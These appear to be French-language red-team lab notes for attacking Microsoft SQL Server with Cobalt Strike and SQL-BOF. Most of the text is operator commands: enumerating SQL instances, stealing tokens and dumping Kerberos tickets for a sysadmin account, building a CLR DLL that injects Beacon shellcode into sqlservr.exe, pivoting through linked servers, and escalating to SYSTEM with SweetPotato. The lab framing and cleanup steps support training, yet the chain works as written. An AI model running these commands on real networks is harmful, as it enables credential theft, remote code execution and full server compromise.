# Microsoft SQL Server

**Parcours :** énumérer les serveurs SQL → identifier les comptes privilégiés → vérifier le rôle `sysadmin` → étudier SQL CLR → comprendre le Lateral Movement via Linked Servers → examiner `SeImpersonatePrivilege`.

**Pourquoi SQL Server ?** Les instances SQL utilisent des comptes de service dont les droits doivent être vérifiés. SQL CLR et les Linked Servers peuvent étendre les possibilités d’exécution et de connexion entre machines.

* [Charger SQL-BOF](#charger-le-script-sql-bof-aggressor)
* [Énumération SQL](#énumération-sql)
* [Impersonation](#impersonation)
* [SQL CLR](#exécution-de-code-avec-sql-clr)
* [Lateral Movement SQL](#lateral-movement-sql)
* [Privilege Escalation SQL](#privilege-escalation-sql)

---

## Charger le script SQL-BOF Aggressor

Avant d’utiliser les commandes `sql-*`, charger le script CNA SQL-BOF :

**Cobalt Strike → Script Manager → Load → `C:\Tools\SQL-BOF\SQL\SQL.cna`**

> `OPSEC-SAFE` dans ces notes — SQL-BOF utilise des Beacon Object Files (BOF) exécutés dans le contexte du Beacon, sans lancer systématiquement un processus enfant.

---

## Énumération SQL

**Objectif :** identifier les serveurs SQL, leurs modes d’authentification et les permissions de l’utilisateur courant avant toute autre opération.

### Identifier les instances SQL avec leurs SPN

```
ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
```

> `OPSEC-SAFE` dans ces notes — requête LDAP effectuée depuis la connexion au domaine du Beacon.  
> `samAccountType=805306368` identifie les comptes utilisateurs dans Active Directory. Un SPN `MSSQLSvc/hostname:port` permet d’identifier le service SQL déclaré pour Kerberos.

### Rechercher les groupes SQL et leurs membres

```
ldapsearch (&(samAccountType=268435456)(|(name=*SQL*)(name=*DB*)(name=*Database*))) --attributes distinguishedName,member
```

> `OPSEC-SAFE` dans ces notes — interrogation LDAP.  
> `samAccountType=268435456` identifie les groupes de sécurité. Examiner les groupes liés à SQL et leurs membres aide à comprendre les rôles accordés sur les instances.

### Rechercher les instances SQL par port

```
portscan 10.10.120.0/23 1433 arp 1024
```

> `OPSEC-CAUTION` — un scan réseau basé sur ARP génère du trafic observable par les systèmes IDS/NDR. Vérifier les règles du lab avant de l’utiliser.

### Vérifier les informations d’une instance SQL

```
sql-1434udp 10.10.120.20       # UDP broadcast — finds instance name and version without auth
sql-info lon-db-1              # auth mode, version, linked servers, config overview
sql-whoami lon-db-1            # your current login name + role on this instance
sql-query lon-db-1 "SELECT @@SERVERNAME"   # verify which server you are connected to
```

> `OPSEC-SAFE` dans les notes — commandes SQL-BOF exécutées depuis le Beacon.  
> `sql-info` présente le mode d’authentification Windows ou SQL et l’existence éventuelle de Linked Servers.  
> `sql-whoami` indique le compte et les rôles SQL de la session, notamment `public`, `guest` ou `sysadmin`.

### Vérifier l’état de xp_cmdshell

```sql
sql-query lon-db-1 "SELECT name,value FROM sys.configurations WHERE name = 'xp_cmdshell'"
```

> `OPSEC-CAUTION` — une requête sur `sys.configurations` peut être journalisée si l’audit SQL est activé.  
> `value=0` signifie désactivé. L’activation de `xp_cmdshell` modifie la configuration SQL et peut créer des processus enfants visibles par les outils de sécurité.

### Activer xp_cmdshell — option à risque

```
sql-enablexp lon-db-1
```

> `OPSEC-UNSAFE` dans ces notes — `xp_cmdshell` peut lancer `cmd.exe` depuis `sqlservr.exe`, ce qui est facilement observable.

---

## Impersonation

**Contexte :** `pchilds` peut disposer uniquement des rôles `public/guest`, tandis que `rsteel` possède `sysadmin` dans le lab. Les permissions SQL dépendent de l’identité authentifiée.  
Dans ce scénario, SQL Server utilise l’authentification Windows : le ticket Kerberos ou le token Windows détermine l’identité reconnue par l’instance.

### Méthode 1 — Utiliser le token d’un processus existant

> `OPSEC-SAFE` dans ces notes — manipulation du token dans le processus courant, sans création de processus enfant.

```
krb_triage                           # list all Kerberos tickets cached on this host
process_browser                      # find all running processes — look for one owned by rsteel
steal_token <pid>                    # steal rsteel's Windows access token from that process
sql-whoami lon-db-1                  # verify you now appear as rsteel with sysadmin role
```

> `krb_triage` présente les tickets accessibles et permet d’identifier les sessions qui possèdent un TGT.  
> `steal_token` duplique un token d’accès dans le Beacon. Les connexions réseau peuvent ensuite utiliser l’identité liée à ce token, selon leur contexte.  
> Après les vérifications, `rev2self` permet de revenir au contexte d’identité initial.

### Méthode 2 — Utiliser les tickets Kerberos

> `OPSEC-CAUTION` — `krb_dump` interagit avec les mécanismes de tickets Kerberos ; `make_token` crée une session de connexion de type 9 qui peut générer des événements de sécurité.

**Étape 1 — Exporter le TGT de `rsteel` :**

```
krb_triage                                          # confirm rsteel has a TGT cached in LSASS
krb_dump /user:rsteel /service:krbtgt               # extract rsteel's TGT — output is base64 kirbi
```

> `krb_dump` récupère un ticket Kerberos de la session accessible. Le TGT sert à demander des tickets de service auprès du KDC.

**Étape 2 — Demander un ticket de service MSSQLSvc :**

```
krb_asktgs /service:MSSQLSvc/lon-db-1.contoso.com:1433 /ticket:[base64-TGT-from-above]
```

> Cette demande vise le service Kerberos `MSSQLSvc/lon-db-1:1433` à l’aide du TGT indiqué.  
> Le KDC valide la demande puis délivre un ticket de service protégé par la clé du compte de service SQL.  
> Le SPN `MSSQLSvc/lon-db-1.contoso.com:1433` doit correspondre au service enregistré dans Active Directory.

**Étape 3 — Enregistrer et importer le ticket :**

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\mssql.kirbi", [Convert]::FromBase64String("[base64-ST-output]"))
```

```
make_token CONTOSO\rsteel FakePass       # create a logon session — password is irrelevant (never validated)
kerberos_ticket_use C:\Users\Attacker\Desktop\mssql.kirbi   # inject service ticket into that session
run klist                                # verify ticket appears in klist output
sql-whoami lon-db-1                      # confirm sysadmin role
```

> `make_token` crée une session `NewCredentials` de type 9. La validation des identifiants réseau intervient lors de leur utilisation, selon les mécanismes d’authentification disponibles.  
> `kerberos_ticket_use` charge le fichier `.kirbi` dans la session Kerberos du Beacon.  
> Une fois le lab terminé, supprimer le fichier `.kirbi` temporaire : `rm C:\Users\Attacker\Desktop\mssql.kirbi`

---

## Exécution de code avec SQL CLR

**Principe :** le rôle `sysadmin` peut permettre d’activer SQL CLR, qui exécute une assembly .NET dans le contexte du processus `sqlservr.exe`. L’absence de processus enfant n’implique pas l’absence de traces ou de détection.

### Vérifier puis activer SQL CLR

```
sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"
sql-enableclr lon-db-1
```

> `OPSEC-CAUTION` — l’activation de CLR modifie la configuration SQL Server via `sp_configure`. Elle peut être enregistrée par les outils d’audit.  
> CLR doit être activé pour que l’instance accepte les assemblies .NET.

### Générer le binaire SMB prévu dans le lab

**Payloads → Windows Stageless Payload:**
- Listener: `smb` — Beacon utilisant une named pipe SMB lorsque les connexions TCP directes sont limitées
- Output: `Raw` — données binaires brutes sans conteneur PE
- Exit Function: `Thread` — termine le thread plutôt que le processus SQL Server
- x64: ✓
- Enregistrer : `C:\Payloads\smb_x64.xthread.bin`

> `OPSEC-CAUTION` — une DLL intégrant des octets de payload peut déclencher une détection Microsoft Defender. L’évaluation doit tenir compte de la configuration du lab.  
> La fonction de sortie `Thread` évite de terminer directement le processus `sqlservr.exe`.

### Compiler la DLL CLR dans Visual Studio

**Visual Studio → New Project → Class Library (.NET Framework) C# :**
- Nom du projet : `MyProcedure`
- Placer le projet et la solution dans le même dossier : ✓
- Framework: .NET Framework 4.7.2 (doit correspondre au runtime CLR pris en charge par SQL Server)

**Ajouter le fichier binaire comme ressource intégrée :**
1. Solution Explorer → clic droit sur le projet → Add → Existing Item → choisir `C:\Payloads\smb_x64.xthread.bin`
2. Sélectionner le fichier dans Solution Explorer → Properties → Build Action : **Embedded Resource**

> Une ressource intégrée est incluse directement dans la DLL ; le programme peut ensuite la lire depuis son manifeste.

**Attention : vérifier le nom exact de la ressource intégrée dans le code :**

```c#
// Resource name format: <AssemblyName>.<filename>
// Must match exactly — case-sensitive, dots preserved
using (var rs = assembly.GetManifestResourceStream("MyProcedure.smb_x64.xthread.bin"))
```

> Une différence entre `smb.x64.xthread.bin` et `smb_x64.xthread.bin` peut renvoyer une référence `null`. Vérifier le nom du fichier dans Solution Explorer.

**Compilation :** sélectionner le mode Release → Build → Build Solution  
DLL générée : `C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll`

### Charger et exécuter l’assembly CLR sur SQL Server

```
sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
```

> `OPSEC-CAUTION` — SQL-BOF charge la DLL dans le contexte SQL CLR, enregistre l’assembly et appelle la procédure stockée `MyProcedure`.  
> Dans le lab, le code .NET utilise `VirtualAlloc`, `WriteProcessMemory` et `CreateThread` dans `sqlservr.exe` ; les permissions correspondent au compte de service SQL.  
> Le chargement de certaines assemblies nécessite une configuration de confiance ou une signature appropriée. Contrôler les paramètres `TRUSTWORTHY` et les permissions.

### Établir la liaison avec le nouveau Beacon SMB

Dans ce lab, le Beacon SMB écoute via une named pipe au sein de `sqlservr.exe`. La connexion exige un contexte CIFS/SMB autorisé pour `lon-db-1`.

**Méthode A — connexion depuis le Beacon `pchilds` :**

```
link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```

> `OPSEC-SAFE` dans ces notes — Windows peut utiliser le contexte Kerberos déjà disponible dans le Beacon `pchilds` pour une authentification SMB.  
> Le nom `TSVCPIPE` dépend de la configuration du listener SMB. La touche TAB permet parfois de compléter le nom.

**Méthode B — examiner la demande manuelle d’un ticket CIFS :**

```
krb_asktgs /service:cifs/lon-db-1.contoso.com /ticket:[rsteel-TGT-base64]
```

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs.kirbi", [Convert]::FromBase64String("[base64-output-from-above]"))
```

```
kerberos_ticket_use C:\Users\Attacker\Desktop\cifs.kirbi
run klist                                                      # confirm cifs/lon-db-1 ticket present
link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```

> `OPSEC-CAUTION` — un fichier `.kirbi` temporaire est écrit sur le disque. Après le lab, supprimer : `rm C:\Users\Attacker\Desktop\cifs.kirbi`  
> La méthode B concerne les sessions ne pouvant pas demander automatiquement un ticket de service CIFS.  
> **Pourquoi CIFS ?** L’authentification SMB utilise la classe de service CIFS, distincte de `MSSQLSvc`.

### Rétablir le paramètre CLR après le lab

```
sql-disableclr lon-db-1
```

> `OPSEC-SAFE` dans ces notes — le retour à la configuration initiale fait partie du nettoyage du lab.

---

## Lateral Movement SQL

**Principe :** un Linked Server permet à une instance SQL d’interroger une autre instance. Les droits accordés sur le serveur distant dépendent du mapping d’authentification et de ses rôles SQL.

### Énumérer les Linked Servers et les permissions distantes

```
sql-links lon-db-1                          # show all linked servers configured on lon-db-1
sql-whoami lon-db-1 "" lon-db-2             # check your privilege level on lon-db-2 via the link
```

> `OPSEC-SAFE` dans les notes — requêtes BOF sans processus enfant.  
> Le deuxième argument `""` signifie qu’aucun saut intermédiaire n’est indiqué dans cette commande du lab.  
> Un rôle `sysadmin` sur `lon-db-2` indique que le compte utilisé dispose de permissions élevées sur l’instance distante.

### Vérifier et activer RPC Out sur le Linked Server

```
sql-checkrpc lon-db-1                       # query current RPC Out status on all links
sql-enablerpc lon-db-1 lon-db-2             # enable RPC Out on the link to lon-db-2
```

> `OPSEC-CAUTION` — une modification du Linked Server peut apparaître dans les journaux SQL Server et dans `sys.servers`.  
> **Pourquoi RPC Out ?** L’instruction `EXECUTE AT linked_server` nécessite RPC Out pour lancer certaines procédures sur l’instance distante.

### Exécuter l’assembly CLR sur `lon-db-2` via le lien

```
sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure "" lon-db-2
```

> `OPSEC-CAUTION` — le lab reproduit le chargement CLR via le lien SQL entre `lon-db-1` et `lon-db-2`.  
> Le quatrième argument `""` désigne l’absence de saut intermédiaire ; le cinquième désigne `lon-db-2`.  
> Dans le scénario, le Beacon fonctionne dans le processus `sqlservr.exe` de `lon-db-2`, avec les droits du compte de service local.

### Établir la liaison avec le Beacon de `lon-db-2`

```
link lon-db-2 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```

> `OPSEC-SAFE` dans ces notes — connexion SMB par named pipe entre les deux serveurs.  
> **Contexte du lab :** la connexion est effectuée depuis le Beacon de `lon-db-1`.  
> **Réseau :** `lon-db-2` peut être isolé de l’Attacker Desktop. Le lab utilise la connectivité SMB entre les deux serveurs pour établir cette chaîne : `Attacker CS → Beacon lon-db-1 → Beacon lon-db-2`.  
> Le Beacon de `lon-db-1` utilise un compte de service MSSQL dont les autorisations CIFS doivent être vérifiées.

### Rétablir RPC Out après le lab

```
sql-disablerpc lon-db-1 lon-db-2
```

> `OPSEC-SAFE` dans ces notes — restaurer la configuration RPC Out initiale.

---

## Privilege Escalation SQL

**Contexte :** ce lab étudie les conséquences de `SeImpersonatePrivilege` sur un compte de service SQL. Sa présence dépend de la configuration et doit être confirmée avant toute analyse.

### Vérifier le privilège du compte SQL

```
whoami /priv    # BOF - check token privileges
```

> Rechercher la valeur `SeImpersonatePrivilege: Enabled`.  
> Le compte `NT Service\MSSQLSERVER` peut disposer de ce privilège. Le vérifier plutôt que de le supposer.

### Générer le binaire TCP local du lab

**Payloads → Windows Stageless Payload:**
- Listener: `tcp-local` — écoute sur `127.0.0.1`, sans exposition directe sur une interface externe
- Format de sortie : exécutable Windows
- Fonction de sortie : Process
- x64: ✓
- Enregistrer : `C:\Payloads\tcp-local_x64.exe`

> `tcp-local` permet au lab d’utiliser une connexion en loopback lorsque `lon-db-2` n’accepte pas de connexions directes depuis le team server.

### Examiner le transfert du payload dans le lab

```
cd C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps
pwd
upload C:\Payloads\tcp-local_x64.exe
```

> `OPSEC-CAUTION` — écriture de fichier sur le disque.  
> **Répertoire :** le scénario utilise un chemin situé dans le profil du compte de service MSSQL. Les permissions du dossier et la couverture Defender doivent être vérifiées ; aucune absence de détection n’est garantie.

### Étudier `SeImpersonatePrivilege` avec SweetPotato

```
execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
```

> `OPSEC-CAUTION` — `execute-assembly` s’appuie sur fork-and-run. Le scénario SweetPotato décrit l’usage d’une authentification DCOM et d’un token privilégié pour étudier une élévation locale.  
> Résultat présenté dans le lab : exécution sous `NT AUTHORITY\SYSTEM`.  
> La configuration `spawnto` du Malleable C2 Profile doit être cohérente avec les contraintes et règles du lab.

### Se connecter au Beacon SYSTEM

```
connect localhost 1337
```

> `OPSEC-SAFE` dans ces notes — connexion TCP locale entre deux sessions sur `lon-db-2`.  
> Le port `1337` est défini dans le listener `tcp-local`.

Dans le scénario, le nouveau Beacon s’exécute sous `NT AUTHORITY\SYSTEM` sur `lon-db-2`.
